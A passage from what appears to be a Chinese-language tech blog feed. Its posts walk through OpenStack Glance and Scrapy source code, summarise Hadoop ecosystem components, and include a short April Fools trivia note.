class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_repo</span><span class="params">(self, context)</span>:</span></span><br><span class="line">       image_repo = glance.db.ImageRepo(context, self.db_api)<span class="comment">#取出</span></span><br><span class="line">       store_image_repo = glance.location.ImageRepoProxy(</span><br><span class="line">           image_repo, context, self.store_api, self.store_utils)</span><br><span class="line">       quota_image_repo = glance.quota.ImageRepoProxy(</span><br><span class="line">           store_image_repo, context, self.db_api, self.store_utils)</span><br><span class="line">       policy_image_repo = policy.ImageRepoProxy(</span><br><span class="line">           quota_image_repo, context, self.policy)</span><br><span class="line">       notifier_image_repo = glance.notifier.ImageRepoProxy(</span><br><span class="line">           policy_image_repo, context, self.notifier)</span><br><span class="line">       <span class="keyword">if</span> property_utils.is_property_protection_enabled():</span><br><span class="line">           property_rules = property_utils.PropertyRules(self.policy)</span><br><span class="line">           pir = property_protections.ProtectedImageRepoProxy(</span><br><span class="line">               notifier_image_repo, context, property_rules)</span><br><span class="line">           authorized_image_repo = authorization.ImageRepoProxy(</span><br><span class="line">               pir, context)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           authorized_image_repo = authorization.ImageRepoProxy(</span><br><span class="line">               notifier_image_repo, context)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> authorized_image_repo</span><br></pre></td></tr></table></figure><p>每一层的功能简介</p><table><thead><tr><th>层</th><th>描述</th></tr></thead><tbody><tr><td>Authorization</td><td>认证层：提供了一个镜像本身或其属性是否可以改变的验证</td></tr><tr><td>Property protection</td><td>属性保护层：该层是可选的，如果你在配置文件中设置了property_protection_file参数，它就变得可用。可以通过配置文件指明访问权限。</td></tr><tr><td>Notifier</td><td>消息通知层：关于镜像变化的消息和使用镜像时发生的错误和警告都会被添加到消息队列中。</td></tr><tr><td>Policy</td><td>规则定义层：定义镜像操作的访问规则，规则在/etc/policy.json文件中定义，该层进行监视并实施。</td></tr><tr><td>Quota</td><td>配额限制层：如果管理者对某用户定义了镜像大小的镜像上传上限，则若该用户上传了超过该限额的镜像，则会上传失败。</td></tr><tr><td>Location</td><td>镜像位置定位层：通过glance_store与后台存储进行交互，例如上传、下载和管理图像位置。1. 添加新位置时检查位置URI是否正确；2. 镜像位置改变时，删除存储后端保存的镜像数据；3. 防止镜像位置重复；</td></tr><tr><td>Database</td><td>数据库层：实现与数据库进行交互的API。</td></tr></tbody></table><h3 id="2-镜像上传过程"><a href="#2-镜像上传过程" class="headerlink" title="2.镜像上传过程"></a>2.镜像上传过程</h3><p>1.获取image schema（镜像所支持的属性字典定义）</p><p>2.调用glance image create接口创建image，创建完成后image处于queued状态（返回的是image信息）</p><p>3.调用glance image data的upload接口，上传image数据；在上传过程中，image处于saving状态；上传完成后，image处于active状态</p><p>4.调用glance image get接口，获取image详细信息，并在client中显示</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(<span class="keyword">self</span>, req, image, extra_properties, tags)</span></span><span class="symbol">:</span></span><br><span class="line">        image_factory = <span class="keyword">self</span>.gateway.get_image_factory(req.context)</span><br><span class="line">        image_repo = <span class="keyword">self</span>.gateway.get_repo(req.context)</span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            image = image_factory.new_image(extra_properties=extra_properties,</span><br><span class="line">                                            tags=tags, **image)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_image</span><span class="params">(self, image_id=None, name=None, visibility=<span class="string">'shared'</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              min_disk=<span class="number">0</span>, min_ram=<span class="number">0</span>, protected=False, owner=None,</span></span></span><br><span class="line"><span class="function"><span class="params">              disk_format=None, container_format=None,</span></span></span><br><span class="line"><span class="function"><span class="params">              extra_properties=None, tags=None, os_hidden=False,</span></span></span><br><span class="line"><span class="function"><span class="params">              **other_args)</span>:</span></span><br><span class="line">    extra_properties = extra_properties <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    self._check_readonly(other_args)</span><br><span class="line">    self._check_unexpected(other_args)</span><br><span class="line">    self._check_reserved(extra_properties)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> image_id <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        image_id = str(uuid.uuid4())</span><br><span class="line">    created_at = timeutils.utcnow()</span><br><span class="line">    updated_at = created_at</span><br><span class="line">    status = <span class="string">'queued'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Image(image_id=image_id, name=name, status=status,</span><br><span class="line">                 created_at=created_at, updated_at=updated_at,</span><br><span class="line">                 visibility=visibility, min_disk=min_disk,</span><br><span class="line">                 min_ram=min_ram, protected=protected,</span><br><span class="line">                 owner=owner, disk_format=disk_format,</span><br><span class="line">                 container_format=container_format,</span><br><span class="line">                 os_hidden=os_hidden,</span><br><span class="line">                 extra_properties=extra_properties, tags=tags <span class="keyword">or</span> [])</span><br></pre></td></tr></table></figure><p>开辟镜像,标记镜像id,时间等等，并且检查权限之类的。随后进行add</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, image)</span>:</span></span><br><span class="line">      image_values = self._format_image_to_db(image)</span><br><span class="line">      <span class="keyword">if</span> (image_values[<span class="string">'size'</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">         <span class="keyword">and</span> image_values[<span class="string">'size'</span>] &gt; CONF.image_size_cap):</span><br><span class="line">          <span class="keyword">raise</span> exception.ImageSizeLimitExceeded</span><br><span class="line">      <span class="comment"># the updated_at value is not set in the _format_image_to_db</span></span><br><span class="line">      <span class="comment"># function since it is specific to image create</span></span><br><span class="line">      image_values[<span class="string">'updated_at'</span>] = image.updated_at</span><br><span class="line">      new_values = self.db_api.image_create(self.context, image_values)<span class="comment">#进入</span></span><br><span class="line">      self.db_api.image_tag_set_all(self.context,</span><br><span class="line">                                    image.image_id, image.tags)</span><br><span class="line">      image.created_at = new_values[<span class="string">'created_at'</span>]</span><br><span class="line">      image.updated_at = new_values[<span class="string">'updated_at'</span>]</span><br></pre></td></tr></table></figure><p>每一层的add都有被重写，实现对应层的目的。包括镜像的元数据入库等等。进入upload函数</p><p><img src="https://myndtt.github.io/images/64.jpg" alt="3"></p><p>修改状态并保存。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image_repo.save(image, from_state=<span class="string">'queued'</span>)<span class="comment">#信息入库</span></span><br><span class="line">image.set_data(data, size)<span class="comment">#上传至对应目录(配置文件提供)</span></span><br></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>Glance组件的启动离不开Glance domian 控制器的良好封装。整张图配合文中的表，最好理解了。</p><p><img src="https://myndtt.github.io/images/65.png" alt="5"></p><p>几个库的重要性。</p><p>1.Eventlet (绿色协程)</p><p>2.webob (WebOb是一个Python库，它围绕WSGI请求环境提供包装器，还有一个对象来帮助创建WSGI响应。 对象映射了HTTP的指定行为，包括头解析，内容协商以及条件和范围请求的正确处理。)</p><p>openstack的学习其实就是对python的各类库的学习！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;学习openstack,对其大体框架已经熟悉，学习其内部基本原理，聊以记录。&lt;/p&gt;
&lt;p&gt;作为 OpenStack 的基础支持服务，Keystone 做下面这几件事情：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;OpenStack Glance是一种提供发现，注册，和下载的镜像服务。OpenStack Glance是一个提供虚拟机镜像的集中式仓库。通过Glance的RESTful API，可以查询镜像元数据下载镜像。虚拟机的镜像可以很方便的存储在各种地方，从简单的文件系统到对象存储系统(如OpenStack Swift项目)。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;更多基本概念的介绍可以查看&lt;a href=&quot;https://blog.csdn.net/dylloveyou/article/details/80530838&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一文读懂OpenStack Glance是什么 &lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&quot;二、安装&quot;&gt;&lt;a href=&quot;#二、安装&quot; class=&quot;headerlink&quot; title=&quot;二、安装&quot;&gt;&lt;/a&gt;二、安装&lt;/h2&gt;&lt;p&gt;我的机器是ubuntu 18，可以按照&lt;a href=&quot;https://docs.openstack.org/glance/latest/install/install-ubuntu.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官网&lt;/a&gt;安装。&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="openstack" scheme="https://myndtt.github.io/tags/openstack/"/>
    
      <category term="glance" scheme="https://myndtt.github.io/tags/glance/"/>
    
  </entry>
  
  <entry>
    <title>hadoop(笔记)</title>
    <link href="https://myndtt.github.io/2018/10/16/hadoop/"/>
    <id>https://myndtt.github.io/2018/10/16/hadoop/</id>
    <published>2018-10-16T09:16:28.000Z</published>
    <updated>2019-09-22T05:33:55.215Z</updated>
    
    <content type="html"><![CDATA[<p>信息均来自网络，只是一个笔记，记录而已。</p><h2 id="一-hadoop是什么"><a href="#一-hadoop是什么" class="headerlink" title="一.hadoop是什么"></a>一.hadoop是什么</h2><p>1.Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p><p>2.Hadoop=HDFS（文件系统，数据存储技术相关）+Mapreduce（数据处理）</p><p><code>关键的hadoop 2.0架构图</code><br><img src="https://myndtt.github.io/images/4.jpg" alt="总体架构图"></p><p>三大核心<br>分布式文件系统：HDFS —— 实现将文件分布式存储在很多的服务器上</p><p>分布式运算编程框架：MAPREDUCE —— 实现在很多机器上分布式并行运算</p><p>分布式资源调度平台：YARN——帮用户调度大量的mapreduce程序，并合理分配运算资源</p><a id="more"></a><h2 id="二-HDFS"><a href="#二-HDFS" class="headerlink" title="二.HDFS"></a>二.HDFS</h2><p>Hadoop分布式文件系统(HDFS)被设计成适合运行在通用硬件(commodity hardware)上的分布式文件系统。它能提供高吞吐量的数据访问，非常适合大规模数据集上的应用。</p><p>HDFS采用master/slave架构。一个HDFS集群是由一个Namenode和一定数目的Datanodes组成。Namenode是一个中心服务器，负责管理文件系统的名字空间(namespace)以及客户端对文件的访问。集群中的Datanode一般是一个节点一个，负责管理它所在节点上的存储。</p><p>NameNode：是Master节点，是大领导。管理数据块映射；处理客户端的读写请求；配置副本策略；管理HDFS的名称空间；</p><p>SecondaryNameNode：是一个小弟，分担大哥namenode的工作量；是NameNode的冷备份；合并fsimage和fsedits然后再发给namenode。</p><p>DataNode：Slave节点，奴隶，干活的。负责存储client发来的数据块block；执行数据块的读写操作。</p><p><img src="http://hadoop.apache.org/docs/r1.0.4/cn/images/hdfsarchitecture.gif" alt="hdfs架构"></p><h2 id="三-Mapreduce"><a href="#三-Mapreduce" class="headerlink" title="三.Mapreduce"></a>三.Mapreduce</h2><p>MapReduce是并行处理框架，实现任务分解和调度。原理说通俗一点就是分而治之的思想，将一个大任务分解成多个小任务(map)，小任务执行完了之后，合并计算结果(reduce)。</p><p>mapreduce作业执行涉及4个独立的实体：</p><p>1.客户端（client）：编写mapreduce程序，配置作业，提交作业，这就是程序员完成的工作；</p><p>2.JobTracker：初始化作业，分配作业，与TaskTracker通信，协调整个作业的执行；</p><p>3.TaskTracker：保持与JobTracker的通信，在分配的数据片段上执行Map或Reduce任务，TaskTracker和JobTracker的不同有个很重要的方面，就是在执行任务时候TaskTracker可以有n多个，JobTracker则只会有一个（JobTracker只能有一个就和hdfs里namenode一样存在单点故障，我会在后面的mapreduce的相关问题里讲到这个问题的）</p><p>4.Hdfs：保存作业的数据、配置信息等等，最后的结果也是保存在hdfs上面<br><img src="https://myndtt.github.io/images/6.jpg" alt="Mapreduce架构"></p><p>提到Mapreduce不得不提到hive.</p><p>Hive是在Hadoop上架了一层SQL接口（HQL作为查询接口），可以将SQL翻译成MapReduce（执行层）去Hadoop上执行，这样就使得数据开发和分析人员很方便的使用SQL来完成海量数据的统计和分析，而不必使用编程语言开发MapReduce那么麻烦。Hive的所有数据都存储在HDFS中。</p><p><img src="https://myndtt.github.io/images/61.png" alt="hive示意图"></p><p>提到了hive就要提到Impala</p><p>Impala是基于Hive的大数据实时分析查询引擎，直接使用Hive的元数据库Metadata,意味着impala元数据都存储在Hive的metastore中。Hive适合于长时间的批处理查询分析，而Impala适合于实时交互式SQL查询，Impala给数据分析人员提供了快速实验、验证想法的大数据分析工具。可以先使用hive进行数据转换处理，之后使用Impala在Hive处理后的结果数据集上进行快速的数据分析。<br><img src="https://myndtt.github.io/images/60.png" alt="impala"></p><p>注：</p><blockquote><p>Hive: 依赖于MapReduce执行框架，执行计划分成 map-&gt;shuffle-&gt;reduce-&gt;map-&gt;shuffle-&gt;reduce…的模型。如果一个Query会 被编译成多轮MapReduce，则会有更多的写中间结果。由于MapReduce执行框架本身的特点，过多的中间过程会增加整个Query的执行时间。</p><p>Impala: 把执行计划表现为一棵完整的执行计划树，可以更自然地分发执行计划到各个Impalad执行查询，而不用像Hive那样把它组合成管道型的 map-&gt;reduce模式，以此保证Impala有更好的并发性和避免不必要的中间sort与shuffle</p></blockquote><h2 id="四-yarn"><a href="#四-yarn" class="headerlink" title="四.yarn"></a>四.yarn</h2><p>第一代Hadoop，由分布式存储系统HDFS和分布式计算框架MapReduce组成，其中，HDFS由一个NameNode和多个DataNode组成，MapReduce由一个JobTracker和多个TaskTracker组成.</p><p>第二代Hadoop，为克服Hadoop1.0中HDFS和MapReduce存在的各种问题而提出的。针对Hadoop 1.0中的单NameNode制约HDFS的扩展性问题，提出了HDFSFederation，它让多个NameNode分管不同的目录进而实现访问隔离和横向扩展；针对Hadoop 1.0中的MapReduce在扩展性和多框架支持方面的不足，提出了全新的资源管理框架YARN。</p><p><img src="http://www.aboutyun.com/data/attachment/forum/201701/28/173203drwcdwdu31dnwdit.jpg" alt="yarn示意图"></p><p>可以看出JobTracker的功能被分散到各个进程中包括ResourceManager和NodeManager：比如监控功能，分给了NodeManager，和Application Master。<br>ResourceManager里面又分为了两个组件：调度器及应用程序管理器。也就是说Yarn重构后，JobTracker的功能，被分散到了各个进程中。同时由于这些进程可以被单独部署所以这样就大大减轻了单点故障，及压力。</p><p><img src="https://myndtt.github.io%5Cimages%5C5.jpg" alt="比较"></p><h2 id="五-其他"><a href="#五-其他" class="headerlink" title="五.其他"></a>五.其他</h2><h3 id="1-Kafka"><a href="#1-Kafka" class="headerlink" title="1.Kafka"></a>1.Kafka</h3><p>kafka是一个分布式的消息缓存系统，可以同时支持离线数据处理和实时数据处理。</p><h3 id="2-spark"><a href="#2-spark" class="headerlink" title="2.spark"></a>2.spark</h3><p>spark是一个非常流行的内存计算（或者迭代式计算，DAG计算）框架，在MapReduce因效率低下而被广为诟病时出现的一个令人称赞的框架。</p><h3 id="3-Zookeeper"><a href="#3-Zookeeper" class="headerlink" title="3.Zookeeper"></a>3.Zookeeper</h3><p>Zookeeper 分布式服务框架是Hadoop的一个子项目。它主要是用来解决分布式应用中常常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信息均来自网络，只是一个笔记，记录而已。&lt;/p&gt;
&lt;h2 id=&quot;一-hadoop是什么&quot;&gt;&lt;a href=&quot;#一-hadoop是什么&quot; class=&quot;headerlink&quot; title=&quot;一.hadoop是什么&quot;&gt;&lt;/a&gt;一.hadoop是什么&lt;/h2&gt;&lt;p&gt;1.Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。&lt;/p&gt;
&lt;p&gt;2.Hadoop=HDFS（文件系统，数据存储技术相关）+Mapreduce（数据处理）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;关键的hadoop 2.0架构图&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;https://myndtt.github.io/images/4.jpg&quot; alt=&quot;总体架构图&quot;&gt;&lt;/p&gt;
&lt;p&gt;三大核心&lt;br&gt;分布式文件系统：HDFS —— 实现将文件分布式存储在很多的服务器上&lt;/p&gt;
&lt;p&gt;分布式运算编程框架：MAPREDUCE —— 实现在很多机器上分布式并行运算&lt;/p&gt;
&lt;p&gt;分布式资源调度平台：YARN——帮用户调度大量的mapreduce程序，并合理分配运算资源&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录 hadoop" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95-hadoop/"/>
    
  </entry>
  
  <entry>
    <title>无题(二)</title>
    <link href="https://myndtt.github.io/2018/03/29/%E6%97%A0%E9%A2%98-%E4%BA%8C/"/>
    <id>https://myndtt.github.io/2018/03/29/无题-二/</id>
    <published>2018-03-29T03:08:21.000Z</published>
    <updated>2019-09-22T05:04:46.334Z</updated>
    
    <content type="html"><![CDATA[<p>过几天就是愚人节了，说一点胡言乱语吧,就几句话，其实就是想水一水。</p><h3 id="0x00-chr"><a href="#0x00-chr" class="headerlink" title="0x00.chr"></a>0x00.chr</h3><p>chr(x)=chr(x+256)</p><h3 id="0x01-时差"><a href="#0x01-时差" class="headerlink" title="0x01.时差"></a>0x01.时差</h3><p>韩国比中国快一个小时</p><h3 id="0x02-MD5"><a href="#0x02-MD5" class="headerlink" title="0x02.MD5"></a>0x02.MD5</h3><p>二进制md5相等的有</p><a id="more"></a><h3 id="0x03-一个eval性质"><a href="#0x03-一个eval性质" class="headerlink" title="0x03.一个eval性质"></a>0x03.一个eval性质</h3><p><img src="https://myndtt.github.io/images/eval.png" alt="eval"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;过几天就是愚人节了，说一点胡言乱语吧,就几句话，其实就是想水一水。&lt;/p&gt;
&lt;h3 id=&quot;0x00-chr&quot;&gt;&lt;a href=&quot;#0x00-chr&quot; class=&quot;headerlink&quot; title=&quot;0x00.chr&quot;&gt;&lt;/a&gt;0x00.chr&lt;/h3&gt;&lt;p&gt;chr(x)=chr(x+256)&lt;/p&gt;
&lt;h3 id=&quot;0x01-时差&quot;&gt;&lt;a href=&quot;#0x01-时差&quot; class=&quot;headerlink&quot; title=&quot;0x01.时差&quot;&gt;&lt;/a&gt;0x01.时差&lt;/h3&gt;&lt;p&gt;韩国比中国快一个小时&lt;/p&gt;
&lt;h3 id=&quot;0x02-MD5&quot;&gt;&lt;a href=&quot;#0x02-MD5&quot; class=&quot;headerlink&quot; title=&quot;0x02.MD5&quot;&gt;&lt;/a&gt;0x02.MD5&lt;/h3&gt;&lt;p&gt;二进制md5相等的有&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>scrapy 浅分析(四)</title>
    <link href="https://myndtt.github.io/2018/02/01/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E5%9B%9B/"/>
    <id>https://myndtt.github.io/2018/02/01/scrapy-浅分析-四/</id>
    <published>2018-02-01T11:45:11.000Z</published>
    <updated>2019-09-22T05:04:46.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h1><p><a href="http://myndtt.com/2018/01/30/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%B8%80/" target="_blank" rel="noopener">前面一</a></p><p><a href="http://myndtt.com/2018/01/31/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%BA%8C/" target="_blank" rel="noopener">前面二</a></p><p><a href="http://myndtt.com/2018/02/01/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%B8%89/" target="_blank" rel="noopener">前面三</a></p><p>这次接着上回要提到下载的地方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_next_request_from_scheduler</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">        slot = self.slot</span><br><span class="line">        request = slot.scheduler.next_request()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment">#去下载</span></span><br><span class="line">        d = self._download(request, spider)</span><br><span class="line">        <span class="comment">#处理下载返回结果</span></span><br><span class="line">        d.addBoth(self._handle_downloader_output, request, spider)</span><br><span class="line">        d.addErrback(<span class="keyword">lambda</span> f: logger.info(<span class="string">'Error while handling downloader output'</span>,</span><br><span class="line">                                           exc_info=failure_to_exc_info(f),</span><br><span class="line">                                           extra=&#123;<span class="string">'spider'</span>: spider&#125;))</span><br><span class="line">        d.addBoth(<span class="keyword">lambda</span> _: slot.remove_request(request))</span><br><span class="line">        d.addErrback(<span class="keyword">lambda</span> f: logger.info(<span class="string">'Error while removing request from slot'</span>,</span><br><span class="line">                                           exc_info=failure_to_exc_info(f),</span><br><span class="line">                                           extra=&#123;<span class="string">'spider'</span>: spider&#125;))</span><br><span class="line">        d.addBoth(<span class="keyword">lambda</span> _: slot.nextcall.schedule())</span><br><span class="line">        d.addErrback(<span class="keyword">lambda</span> f: logger.info(<span class="string">'Error while scheduling new request'</span>,</span><br><span class="line">                                           exc_info=failure_to_exc_info(f),</span><br><span class="line">                                           extra=&#123;<span class="string">'spider'</span>: spider&#125;))</span><br><span class="line">        <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure><a id="more"></a><p>列出相关函数得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_download</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        slot = self.slot</span><br><span class="line">        slot.add_request(request)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_on_success</span><span class="params">(response)</span>:</span></span><br><span class="line">           <span class="comment">#成功返回</span></span><br><span class="line">            <span class="keyword">assert</span> isinstance(response, (Response, Request))</span><br><span class="line">            <span class="comment">#返回的是response则执行如下操作</span></span><br><span class="line">            <span class="keyword">if</span> isinstance(response, Response):</span><br><span class="line">                response.request = request <span class="comment"># tie request to response received</span></span><br><span class="line">                logkws = self.logformatter.crawled(request, response, spider)</span><br><span class="line">                logger.log(*logformatter_adapter(logkws), extra=&#123;<span class="string">'spider'</span>: spider&#125;)</span><br><span class="line">                self.signals.send_catch_log(signal=signals.response_received, \</span><br><span class="line">                    response=response, request=request, spider=spider)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_on_complete</span><span class="params">(_)</span>:</span></span><br><span class="line">          <span class="comment">#完成后进行下一次</span></span><br><span class="line">            slot.nextcall.schedule()</span><br><span class="line">            <span class="keyword">return</span> _</span><br><span class="line"><span class="comment">#去执行那个downloader的函数</span></span><br><span class="line">        dwld = self.downloader.fetch(request, spider)</span><br><span class="line">        <span class="comment">#回调到上面那个函数</span></span><br><span class="line">        dwld.addCallbacks(_on_success)</span><br><span class="line">        <span class="comment">#回调到上面那个函数</span></span><br><span class="line">        dwld.addBoth(_on_complete)</span><br><span class="line">        <span class="keyword">return</span> dwld</span><br></pre></td></tr></table></figure><p>更进<code>fetch</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_deactivate</span><span class="params">(response)</span>:</span></span><br><span class="line">      <span class="comment">#删除这个request</span></span><br><span class="line">            self.active.remove(request)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"><span class="comment">#加入该request</span></span><br><span class="line">        self.active.add(request)</span><br><span class="line">        <span class="comment">#调用下载的中间件，回调到_enqueue_request函数</span></span><br><span class="line">        dfd = self.middleware.download(self._enqueue_request, request, spider)</span><br><span class="line">        <span class="comment">#最后调用上面那个函数也就是删除操作</span></span><br><span class="line">        <span class="keyword">return</span> dfd.addBoth(_deactivate)</span><br></pre></td></tr></table></figure><p>OK，进入<code>download</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(self, download_func, request, spider)</span>:</span></span><br><span class="line"><span class="meta">        @defer.inlineCallbacks</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(request)</span>:</span></span><br><span class="line">        <span class="comment">#按字面意思来如果中间件有这个方法就执行</span></span><br><span class="line">        <span class="comment">#这里需要说明request，response，下载器要对调度器的请求和下载后的返回结果进行不同对待</span></span><br><span class="line">            <span class="keyword">for</span> method <span class="keyword">in</span> self.methods[<span class="string">'process_request'</span>]:</span><br><span class="line">                response = <span class="keyword">yield</span> method(request=request, spider=spider)</span><br><span class="line">                <span class="keyword">assert</span> response <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> isinstance(response, (Response, Request)), \</span><br><span class="line">                        <span class="string">'Middleware %s.process_request must return None, Response or Request, got %s'</span> % \</span><br><span class="line">                        (six.get_method_self(method).__class__.__name__, response.__class__.__name__)</span><br><span class="line">                <span class="keyword">if</span> response:</span><br><span class="line">                    defer.returnValue(response)</span><br><span class="line">             <span 